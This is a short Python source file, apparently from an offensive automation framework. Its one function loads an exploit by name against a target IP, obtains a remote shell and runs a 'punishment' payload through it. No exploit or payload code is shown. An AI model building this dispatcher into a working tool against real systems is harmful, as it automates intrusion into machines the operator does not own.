import exploit_cl, shell_cl, payload_cl

def run_threaded_routine(args, method, punishment,ip):
	exploit = getattr(exploit_cl,method)(ip,args)
	shell = exploit.get_shell() # execute exploit
	if issubclass(type(shell),shell_cl.shell_class): # make sure the shell exists
		getattr(payload_cl,punishment['type'])(shell,punishment["args"],exploit).execute_payload()
		shell.close()